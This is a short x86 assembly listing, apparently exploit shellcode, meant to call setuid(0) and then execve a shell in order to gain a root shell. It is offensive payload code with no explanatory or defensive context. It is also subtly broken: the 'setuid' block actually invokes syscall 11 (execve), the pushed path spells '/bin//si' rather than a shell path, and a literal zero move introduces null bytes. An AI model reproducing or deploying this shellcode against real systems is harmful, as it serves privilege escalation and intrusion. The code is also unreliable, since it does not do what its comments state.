global _start

section .text
_start:

;setuid
xor     eax, eax
mov     ebx, eax
mov     eax, 11
int     0x80

;execve
xor     ecx, ecx
push    ecx
push    0x69732f2f
push    0x6e69622f
mov     ebx, esp
mov     edx, 0x00000000
xor     eax, eax
mov     eax, 11
int     0x80
